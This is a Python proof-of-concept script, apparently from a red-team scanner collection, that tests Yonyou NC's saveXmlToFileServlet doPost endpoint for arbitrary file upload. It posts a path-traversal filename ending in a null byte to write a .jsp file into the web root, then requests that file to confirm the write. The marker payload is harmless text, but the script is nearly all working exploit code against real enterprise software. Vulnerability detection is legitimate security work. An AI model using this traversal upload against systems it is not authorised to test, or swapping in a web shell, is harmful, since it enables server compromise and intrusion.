'''
Function:
    yonyou dopost 任意文件上传
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import random
import string
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
            'Cookie': 'LA_K1=langid',
            'serverEnable': 'localserver',
            'Content-Type': 'application/octet-stream',
            'Content-Encoding': 'UTF_8'
        }
        self.headers_check = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        file_name = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        url = "{}://{}/portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..%5C..%5C..%5Cwebapps%5Cnc_web%5C{}.jsp%00".format(scheme, netloc, file_name)
        char = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        payload = "test" + char
        try:
            result = requests.post(url=url, data=payload, headers=self.headers, proxies=self.proxies, verify=False)
            result1 = requests.get(url="{}://{}/{}.jsp".format(scheme, netloc, file_name), headers=self.headers_check, proxies=self.proxies, verify=False)
            if payload in result1.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n\n                 {}".format(payload)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False

